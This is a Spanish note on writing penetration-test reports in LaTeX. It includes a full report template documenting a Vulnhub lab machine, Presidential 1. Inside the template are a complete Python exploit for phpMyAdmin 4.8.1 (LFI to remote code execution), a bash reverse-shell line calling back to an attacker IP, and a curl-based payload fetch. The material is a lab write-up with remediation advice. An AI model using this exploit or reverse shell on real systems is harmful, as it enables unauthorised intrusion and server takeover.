-----
- Tags: #report #teoria 
----

Como vimos en [[LaTeX Injections - ( Inyecciones LaTex )]] ya sabemos que es LaTeX, un lenguaje de marear documentos científicos y técnicos de alta calidad. 

La idea es que se realizaran documentos pdf en los cuales se redactara un informe profesional de las vulnerabilidades y fallas de seguridad encontradas para el sistema auditado. 

----

# Informe Técnico

El informe técnico es un informe en el cual nos explayamos técnicamente con las vulnerabilidades encontradas, como se explotan, etc.

# Informe Ejecutivo 

El informe ejecutivo es un informe el cual va orientado a los ejecutivos que no terminan de entender técnisismos por lo cual es un informe más "relajado".

----

# Metodología 

#### Instalación de dependencias y configuración: 
```bash
apt update 
apt install latexmk zathura
apt install texlive-full 

mkdir /home/{user}/.config/latexmk 
echo '$pdf_previewer = "zathura"; ' > /home/{user}/.config/latexmk/latexmkrc
sudo mkdir /root/.config/latexmk 
sudo ln -s -f /home/{user}/.config/latexmk/latexmkrc /root/.config/latexmk/latexmkrc
```

Los archivos escritos en latex tendrán la terminación **.tex**, de manera que posteriormente se podrán "compilar" en un formato haciendo uso una vez más de **latexmk**:

`latexmk -pdf Documento.tex`

Pero para no estar habriendolo constantemente con **zathura** podemos hacer uso de: 

`latexmk -pdf Documento.tex -pvc`

De manera que podríamos ir editando el documento e ir viendo los cambios en tiempo real. 

-----
`
# Utilidades  

```tex
% Dependencias 
\usepackage[utf8]{inputenc} % Para poder usar caracteres especiales
\usepackage[spanish]{babel} % Para poder usar caracteres especiales 
\usepackage{graphicx} % Para la inserción de imagenes
\usepackage[table,xcdraw]{xcolor} % Representación de colores
\usepackage{tikz,lipsum,lmodern} % Para la creación de boxes
\usepackage[most]{tcolorbox} % Para la creación de boxes 
\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % Para establecer márgenes del documento
\usepackage{fancyhdr} % Definir el estilo de la página
\usepackage[hidelinks]{hyperref} % Gestion de hipervinculos en el indice
\usepackage{setspace} % Para mayor espacio entre líneas
\setstretch{1.2}
\usepackage{parskip} % Eliminar la sangría 
\usepackage[figurename=Imagen]{caption} % Cambiar el nombre del caption de las figuras por Imagen
\usepackage{ragged2e} % Para volver a acomodar los textos despues de los \centering
\usepackage{listings} % Para la inserción de código


% Centrar contenido 
\centering 

\begin{center}
\end{center}

% Agregar imagen
 \makebox[\textwidth]{\includegraphics[width=\paperwidth]{vulnhub.png}} % Que ocupe de manera correcta todo el espacio del documento 
 \includegraphics[width=0.6\textwidth]{\logoPortada}\par\vspace{0.5cm} % Que la imagen ocupe el width del área de escritura

% Dar espacios 
\vfill

% Negrita
\textbf{hola esto esta en negrita}

% Figuras 
% Las figuras son imagenes a las que se puede hacer referencia así como agregar una descripcion
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{whatweb.png}}
    \caption{Tecnologías web identificadas.}
    \label{fig:identifiedWhatweb}
  \end{figure}

% Hacer referencia a una figura y a una página de la figura
La imagen \ref{fig:identifiedWhatweb} en la página \pageref{fig:identifiedWhatweb}

% Tablas
 \begin{tabular}{ | c | c |}
      \hline
      \textbf{Tecnología} & \textbf{Versión} \\
      \hline
      PHP & 5.5.38 \\
      \hline
      Apache & 2.4.6 \\
      \hline
\end{tabular}

% Items 
\begin{itemize}
	 \item Item 1 
	 \item Item 2 
\end{itemize}

% Espacios verticales 
\vspace{0.5cm}

% Indice 
\tableofcontents
\addto\captionsspanish{\renewcommand{\contentsname}{Índice}} % Renombrar el nombre del indice 

% Nueva pagina 
\clearpage

% Nuevas secciones 
\section{Nombre de la sección}

% Subsecciones
\subsection{Nombre de la subsección}

% Declaración de variables 
\newcommand{\variable}{Valor}

% Definición de colores 
\definecolor{bluePortada}{HTML}{146c8a}

% Darle estilo a la página 
\setlength{\headheight}{40.2pt} % aumentar esapaciado de la bara
\renewcommand{\headrulewidth}{3pt} % Aumentar tamaño de la barra
\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
\pagestyle{fancy}
\fancyhf{}
% Agregar logo a la izquierda y a la derecha de todas las páginas 
\lhead{\includegraphics[width=1cm]{image.png}}\rhead{\includegraphics[width=1cm]{image2.png}}

```

A su vez es importante tener en cuenta que existen páginas como [Overleaf](https://www.overleaf.com/) que nos permiten buscar diseños o cosas para agregar a latex como [inserción de código](https://es.overleaf.com/learn/latex/Code_listing) o [cajas de texto](https://www.overleaf.com/latex/examples/drawing-coloured-boxes-using-tcolorbox/pvknncpjyfbp)

---- 
# Ejemplo 

#### A continuación se adjunta un pdf redactado en latex el cual funciona como writeup de la máquina **Presidential 1** de vulnhub:

```tex
\documentclass[a4paper]{article} % Formato de plantilla 

\usepackage[utf8]{inputenc} % Para poder usar caracteres especiales
\usepackage[spanish]{babel} % Para poder usar caracteres especiales 
\usepackage{graphicx} % Para la inserción de imagenes
\usepackage[table,xcdraw]{xcolor} % Representación de colores
\usepackage{tikz,lipsum,lmodern} % Para la creación de boxes
\usepackage[most]{tcolorbox} % Para la creación de boxes 
\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % Para establecer márgenes del documento
\usepackage{fancyhdr} % Definir el estilo de la página
\usepackage[hidelinks]{hyperref} % Gestion de hipervinculos en el indice
\usepackage{setspace} % Para mayor espacio entre líneas
\setstretch{1.2}
\usepackage{parskip} % Eliminar la sangría 
\usepackage[figurename=Imagen]{caption} % Cambiar el nombre del caption de las figuras por Imagen
\usepackage{ragged2e} % Para volver a acomodar los textos despues de los \centering
\usepackage{listings} % Para la inserción de código

% Cambiar el nombre de lcaption de la insercion de código 
\renewcommand{\lstlistingname}{Código}

% CONFIGURACIÓN DE COLORES PARA LA INSERCIÓN DE CÓDIGO
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\newtcolorbox{definicion}{ % Para los cuadores de definición
    breakable,
    enhanced,
    colback=white,
    colframe=bluePortada!75!black,
    arc=0mm,
    boxrule=1pt,
    leftrule=12mm,
    fonttitle=\bfseries,
    coltitle=blue!75!black,
    title=Definición,
    attach title to upper=\par,
}

\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}

\setlength{\parindent}{0pt}
\setlength{\parskip}{0.8em plus 0.5em minus 0.2em} % Establecer espacio entre párrafos en 1em (un espacio de fuente) más 0.5em de espacio extra permitido, con una reducción máxima de 0.2em
\setlength{\parfillskip}{\parindent plus 1fill}

% DECLARACIÓN DE VARIABLES PERSONALIZADAS
\newcommand{\logoPortada}{vulnhub.png}
\newcommand{\machineName}{Presidential 1}
\newcommand{\logoMachine}{logoMachine.png}
\newcommand{\startDate}{06 de Julio de 2023}
\newcommand{\logo}{hacker.png}
\newcommand{\logoEntity}{logoVulnhub.png}

% DEFINICIÓN DE COLORES
\definecolor{bluePortada}{HTML}{146c8a}


% CAMBIAR INIDCE 
\addto\captionsspanish{\renewcommand{\contentsname}{Índice}}

% ESTILO DE LA PÁGINA
\setlength{\headheight}{40.2pt} % aumentar esapaciado de la bara
\renewcommand{\headrulewidth}{3pt} % Aumentar tamaño de la barra
\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
\pagestyle{fancy}
\fancyhf{}
% Agregar logo 
\lhead{\includegraphics[width=1cm]{\logo}}\rhead{\includegraphics[width=1cm]{\logoEntity}}


\begin{document} % Inicio del documento

\cfoot{\thepage} % Para ver la numeración de las páginas

\begin{titlepage}
  \centering
  %\makebox[\textwidth]{\includegraphics[width=\paperwidth]{vulnhub.png}} % Que ocupe de manera correcta todo el espacio del documento 
  \includegraphics[width=0.6\textwidth]{\logoPortada}\par\vspace{0.5cm} % Que la imagen ocupe el width del área de escritura
    % El par es como un salto de línea mientras que el vspace viene de Vertical Space para asignar el espacio 
    {\scshape\LARGE  \textbf{Informe Técnico}\par\vspace{0.4cm}} % Con LARGE más grande y textbf en negrita
    {\Huge\textcolor{bluePortada}{\textbf{Máquina {\machineName}}}} % Huge para la tipografia más grande
    \vfill\vfill
    \includegraphics[width=\textwidth, height=10cm, keepaspectratio]{\logoMachine}
    \vfill\vfill
    \begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
      \centering
      Este documento es confidencial y contiene información sensible.\\No debería ser impreso o compartido con terceras entidades. % El \\ indica un salgo de línea
    \end{tcolorbox}
    \vfill
    {\large \startDate}
    \vfill
  \end{titlepage}

  % ---------------------------------------- INDICE --------------------------------------
  % Nueva pagina
  \clearpage
  \tableofcontents
  \clearpage
  % --------------------------------------------------------------------------------------
  \section{Antecedentes}
   El presente documento toma los resultados obtenidos durante la fase de auditoría realizada a la máquina \textbf{\machineName}, enumerando todos los vectores de ataque encontrados así como la explotación realizada para cada uno de estos.

   Esta máquina a sido descargada de la plataforma de \href{https://vulnhub.com}{\textbf{\color{bluePortada}Vulnhub}}, una plataforma de entrenamiento y práctica para personas interesadas en la seguridad informática y en el hacking ético.

   A continuación, se proporciona el enlace directo de descarga de la máquina:

   \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
  colback=blue!5!white,colframe=blue!75!black,colbacktitle=bluePortada!80!black,
  title=Dirección URL de \machineName,fonttitle=\bfseries,
  boxed title style={size=small,colframe=blue!50!black} ]
  \centering
     \href{https://www.vulnhub.com/entry/presidential-1,500/}{\textbf{\color{bluePortada}https://www.vulnhub.com/entry/presidential-1,500}}
  \end{tcolorbox}
  \vspace{0.5cm}
  \begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{presidential-image.png}}
    \caption{Página principal del servicio web de la máquina expuesto por el puerto 80.}
  \end{figure}

  \section{Objetivos}

  Los objetivos de la presente auditoría de seguridad se enfocan en la identiciación de posibles vulnerabilidades y debilidades en la máquina \textbf{\color{bluePortada}\machineName}, con el propósito de garantizar la integridad y confidencialidad de la información almacenada en ella.

  Con este fin, se ha llevado a cabo un análisis exhaustivo de todos los servicios detectados que se encontraban expuestos en dicho servidor, recopilando la información detallada sobre aquellos que representan un riesgo potencial desde el punto de vista de la seguridad.
  \clearpage
  
  %2.1
  \subsection{Alcance}
  A continuación se representan los objetivos a cumplir para esta auditoría:
  \begin{itemize}
    \item Identificar los puertos y servicios vulnerables.
    \item Realiar una explotación de las vulnerabilidades encontradas.
    \item Conseguir acceso al servidor mediante la explotación de los servicios vulnerables identificados.
    \item Enumerar vías potenciales de elevar privilegios en el sistema una vez este ha sido vulnerado.
  \end{itemize}
  
  % 2.2
  \subsection{Impedimentos y limitaciones}
  Durante el proceso de auditoría, se dejo en claro que está terminantemente prohibido realizar cualquiera de las siguientes actividades:
  \begin{itemize}
    \item Realizar tareas que puedan ocacionar una \textbf{DoS (Denegación de servicio)} o afectar a la disponibilidad de los servicios expuestos
    \item Borrar archivos residentes en el servidor una vez este hay sido vulnerado
  \end{itemize}

  \clearpage 

  \section{Reconocimiento}
  \subsection{Enumeración de servicios expuestos}
  
  A continuación, se adjunta una evidencia de los puertos y servicios identificados durante el reconocimiento aplicado con la herramienta \textbf{Nmap}: 

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{ports.png}}
    \caption{Puertos enumerados.}
  \end{figure}
  \vspace{0.3cm}
  En este caso se identificaron dos puertos activos corriendo por el protocolo TCP:
  
  \vspace{0.8cm}
  
  \centering
  \begin{tikzpicture}[node distance=2cm, every node/.style={rectangle, draw, fill=white}]
    \node (center) {TCP};
    \node (port1) [below left of=center, node distance=3cm] {Puerto 80};
    \node (port2) [below right of=center, node distance=3cm] {Puerto 2082};
    \draw (center) -- (port1);
    \draw (center) -- (port2);
  \end{tikzpicture}

  \vspace{0.5cm}
  \justifying

  Asimismo no se encontraron puertos expuestos a través de otros protocolos, por lo que se priorizará la evaluación de los puertos identificados en el primer escaneo efectuado. 

  \clearpage 

  \subsection{Enumeración del servicio web}

  A continuación se representan los resultados obtenidos con la herramineta \textbf{WhatWeb}, una herramienta de reconocimiento web que se utiliza para identificar tecnologías web específicas que se emplean en un sitio web, tras aplica un reconocimiento sobre el servicio HTTP corriendo por el puerto 80:

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{whatweb.png}}
    \caption{Tecnologías web identificadas.}
    \label{fig:identifiedWhatweb}
  \end{figure}

  En los resultados obtenidos, es posible identificar lsa versiones para algunas de las tecnologías existentes:

  \vspace{0.4cm}
  \centering
  \begin{center}
    \begin{tabular}{ | c | c |}
      \hline
      \textbf{Tecnología} & \textbf{Versión} \\
      \hline
      PHP & 5.5.38 \\
      \hline
      Apache & 2.4.6 \\
      \hline
    \end{tabular}
  \end{center}
  \vspace{0.4cm}
  \justifying

  Dentro de la información representada, también es posible identificar dos correos electrónicos, los cuales podrían ser utilizados de cara a un ataque de \textbf{Phishing}:

  \vspace{0.3cm}
  \begin{center}
    \texttt{contact@example.com} \qquad \texttt{contact@votenow.local}
  \end{center}

  \vspace{0.3cm}

  El \textbf{Phishing} es un tipo de ataque informático que se utiliza para engañar a las personas y obtener información confidencial, como contraseñas, información bancaria o detalles de tarjetas de crédito. El ataque se lleva a cabo mediante el envío de correos electrónicos fraudulentos o mensajes de texto que parecen legítimos y qeu solicitan al destinatario que proporcione información personal o confidencial.

 Adicionalmente también ha sido posible identificar la versión de \textbf{Centos} que se encunetra activa a través de un reconomiento exhaustivo realizado sobre el servidor web con la herramienta \textbf{wig}:

 \begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{wig.png}}
    \caption{Versión de CentOS detectada.}
    \label{fig:identifiedWig}
  \end{figure}
  
  \clearpage

  \subsection{Enumeración de subdominios}
  Una vez identificado el dominio '\textbf{votenow.local}' gracias a los correos electrónicos hayados en la identificación de las tecnologías web en la imagen \ref{fig:identifiedWhatweb} de la página \pageref{fig:identifiedWhatweb}, se procedió a aplicar un ataque de \textbf{fuerza bruta} sobre el dominio principal con el objetivo de identificad subdominios válidos.

  Una vez finalizado el ataque de fuerza bruta, estos fueron los resultados obtenidos:

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{subdomains.png}}
    \caption{Subdominios identificados con gobuster.}
    \label{fig:identifiedSubdomains}
  \end{figure}

  \vspace{0.3cm}

  Se identificó el subdominio '\textbf{datasafe.votenow.local}' como un subdominio válido. Este subdominio representó un punto crucial en la auditoría, dado que fue a través de este qeu se consiguió ingresar al sistema mediante la explotación de vulnerabilidad existente en \textbf{PhpMyAdmin}.

  Cabe destacar que para estos dominios y subdominios fuese accesibles, fue necesario incorporar el siguiente contenido en el archivo '\textbf{/etc/hosts}':

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{etchosts.png}}
    \caption{Contenido agregado al /etc/hosts.}
    \label{fig:identifiedEtchosts}
  \end{figure}

  Esto es así dado que se está aplicando '\textbf{Virtual Hosting}', una técnica utilizada en servidores web para alojar múltiples sitios web en una sola máquina física. El archivo '\textbf{/etc/hosts}' se utiliza para asociar el nombre de domino de cada sitio web con la dirección IP del servidor. 

  Si no se especifica esta asociación, el servidor web no podrá determinar el sitio web correcto para servir, respondiendo con un error o un sitio web incorrecto.

  \clearpage 
  \subsection{Enumeración de paneles de autentiación}

  Una vez descubierto el subdominio '\textbf{datasafe.votenow.local}' representado en la imagén \ref{fig:identifiedSubdomains} de la página \pageref{fig:identifiedSubdomains}, se encontró el siguiente panel de autenticación de \textbf{PhpMyAdmin}:

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{phpmyadmin.png}}
    \caption{Panel de autentiación hayado en el subdominio '\textbf{datasafe.votenow.local}'.}
    \label{fig:identifiedPhpMyAdmin}
  \end{figure}

\vspace{0.6cm}
\section{Identificación y explotación de vulnerabilidades} 
\subsection{Archivo backup expuesto}

Durante una fase de reconocimiento con la herramienta \textbf{gobuster}, se identificó un archivo de Backup expuesto en el servidor.

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{gobusterBackup.png}}
    \caption{Resultado arrojado por gobuster trás la enumeración de archivos con extensión '\textbf{.php.bak}'.}
    \label{fig:identifiedGobusterBackup}
  \end{figure}

  Tras verificar dicho archivo en el navegador para validar si este disponía de información sensible la cual pudiera suponer un riesgo desde el punto de vista de la seguridad, se determinó que el archivo contaba con la siguiente información privilegiada:

\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{Backup.png}}
    \caption{Credenciales de acceso a la base de datos.}
    \label{fig:identifiedBackup}
  \end{figure}

Estas credenciales corresponden a las credenciales de acceso a la base de datos, las cuales a su vez, debido a una reutilización de usuario y contraseña, permitieron ingresar al panel de autenticación de \textbf{PhpMyAdmin} representado en la imagen \ref{fig:identifiedPhpMyAdmin} de la página \pageref{fig:identifiedPhpMyAdmin}.

\vspace{0.4cm}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{phpmyadminAccess.png}}
    \caption{Inicio de sesión en el panel de autentiación \textbf{PhpMyAdmin}.}
    \label{fig:identifiedPhpMyAdminAccess}
  \end{figure}

\clearpage

\subsection{Explotación del panel de autentiación PhpMyAdmin}

Una vez ingresado al \textbf{PhpMyAdmin} fue posible identificar la versión actualmente en uso: 

\vspace{0.4cm}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{phpmyadminversion.png}}
    \caption{Version de \textbf{PhpMyAdmin} en uso.}
    \label{fig:identifiedPhpMyAdminVersion}
  \end{figure}

Esta versión corresponde a una \textbf{versión antigua} de PhpMyAdmin, lo que lo expone a varías \textbf{vulnerabilidades críticas} identificadas: 

\vspace{0.4cm}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{phpmyadminvulns.png}}
    \caption{Vulnerabilidades para la versión 4.8.1 de \textbf{PhpMyAdmin}.}
    \label{fig:identifiedPhpMyAdminVulns}
  \end{figure}

Entre ellas, nos encontramos con la vulnerabilidad \textbf{RCE (Remote Code Execution)} la cual le permite a un atacante mal intencionado \textbf{ejecutar código} remoto \textbf{en el servidor}.

\clearpage

A continuación se comparte el script en Python3 que fue utilizado para lograr ejecutar código remoto en el servidor:

\vspace{0.3cm}

\begin{lstlisting}[language=Python, caption=Exploit para la versión 4.8.1 de PhpMyAdmin]
#!/usr/bin/python3

import re, requests, sys, html

def get_token(content):
  s = re.search('token"\s*value="(.*?)"', content)
  token = html.unescape(s.group(1))
  return token

ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
command = sys.argv[6]

url = "http://{}:{}{}".format(ipaddr,port,path)

url1 = url + "/index.php"
r = requests.get(url1)
content = r.content.decode('utf-8')

s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)

cookies = r.cookies
token = get_token(content)

p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)

cookies = r.cookies
token = get_token(content)

url2 = url + "/import.php"
payload = '''select '<?php system("{}") ?>';'''.format(command)
p = {'table':'', 'token': token, 'sql_query': payload }
r = requests.post(url2, cookies = cookies, data = p)

session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)

content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s != None:
  print(s.group(1))

\end{lstlisting}

\clearpage 

Una vez que ejecutemos el script adjuntandole a este el comando deseado a inyectar, podrémos (Una vez verificada la ejecución de comandos), ganar completo acceso al sistema:

\vspace{0.4cm}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{rce.png}}
    \caption{Ganando acceso al servidor a través de la explotación de la vulnerabilidad de PhpMyAdmin.}
    \label{fig:identifiedRce}
  \end{figure}

En este caso de esta ejecutando el scrip inyectando el comando '\textbf{curl 192.168.1.38}' para que realize una petición a mi equipo el cual hostea un script en bash el cual será solicitado por el servidor a la par que interpretado, el cual garantizará el acceso al sistema: 

\vspace{0.3cm}
\begin{lstlisting}[language=bash, caption=Script en Bash encargado de envíar a un puerto del atacante una consola interactiva.]
#!/bin/bash

bash -i >& /dev/tcp/192.168.1.38/443 0>&1
\end{lstlisting}
\vspace{0.3cm}

Este script esta alojado en el servidor del atacante, evitando de esta forma dejar archivos residuales en el servidor víctima. Una vez ejecutado el comando, el atacante gana acceso al servidor, teniendo control de la máquina en este caso como el usuario '\textbf{apache}'.

Tal y como se puede apreciar en el script de python, principalmente lo que sucede es que el script se aprovecha de una vulnerabilidad de tipo \textbf{LFI} existente en esta versión de PhpMyAdmin para conseguir la ejecución remota de comandos:

\vspace{0.3cm}
\begin{lstlisting}[language=Python, caption=Porción del codigo correspondiente a la explotación del LFI.]
session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)
\end{lstlisting}

  \begin{definicion}
    LFI (\textbf{Local File Inclusion}) Es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante acceder a archivos locales del servidor a través de la inclusión de archivos locales en una página web.
  \end{definicion}

\clearpage

A través del LFI, se consigue apuntar a un recurso de el cual almacena sesiones que representan información relacionada con las diferentes sesiones activas en el uso del lado de los usuarios.

Aprovechando esta lectura y la propia sesión del usuario, lo qeu se hace es que através de una \textbf{query SQL}m se logra introducir una consulta la cual  contiene código PHP, visible desde los archivos de sesión del usuario a través del LFI. Esto en consecuencia conduce a una ejecución remota de comandos, dado que el código PHP es interpretado por el servidor.

\section{Escalada de privilegios}

\section{Contramedidas y buenas prácticas}
Con el objetivo de evitar posibles explotaciones indeseadas en el servidor expuesto, se enumeran a continuación las buneas prácticas a llevar a cabo para las diferentes vulnerabilidades descubiertas. 

\subsection{PhpMyAdmin 4.8.1 vulnerable}
PhpMyAdmin es una herramienta popular para administrar bases de datos MySQL a través de una interfaz web. Sin embargo, la versión 4.8.1 de PhpMyAdmin posee vulnerabilidades conocidas dentro de las cuales como vimos puede permitir a un atacante ejecutar código arbitrario en el servidor web donde está alojado. 

Para corregir esta vulnerabilidad, es necesario actualizar a la versión más actual de PhpMyAdmin. Si por alguna razón no es posible actualizar a la última versión, se pueden tomar algunas medidas para mittigar el riesgo de explotación

\begin{itemize}
  \item Corregir el código del script '\textbf{index.php}' para que la variable '\textbf{target}' proporcionada por el usuario esté bien controlada. 
\end{itemize}
\begin{figure}[h]
    \centering
    \setlength{\fboxrule}{1.4pt}
    \fbox{\includegraphics[width=\textwidth]{lfi_fix.png}}
    \caption{Parámetro target vulnerable a \textbf{LFI}.}
    \label{fig:identifiedRce}
  \end{figure}

  \begin{itemize}
    \item En lugar de permitir que el usuario especifique cualquier archivo que desee incluir, definir una lista de arachivos permiitidos y comprobar que el valor pasado al parámetro '\textbf{target}' esté en la lista antes de incluir el archivo. 
\end{itemize}

\clearpage
\section{Conclusiones}

Se han detectado \textbf{vulnerabilidades críticas} que pueden suponer un riesgo desde el punto de vista de la seguridad. Han sido encontradas vulnerabilidades las cuales permitieron vulnerar la integridad del servidor, consiguiendo acceso al mismo como el usuario '\textbf{apache}'. 

Esto ha sido posible debido a una versión vulnerable de PhpMyAdmin existente en uno de los subdominios identificados durante la fase de reconocmiento bajo el dominio '\textbf{votenow.local}'.

Se recomienda encarecidamente aplicar las contramedidas recomendadas para corregir estas vulnerabilidades lo antes posible, dado qeu de lo contrario se podría comprometer la seguridad del servidor y poner en riesgo la integridad de todos los datos almacenados en este.

\end{document} % Fin del documento

```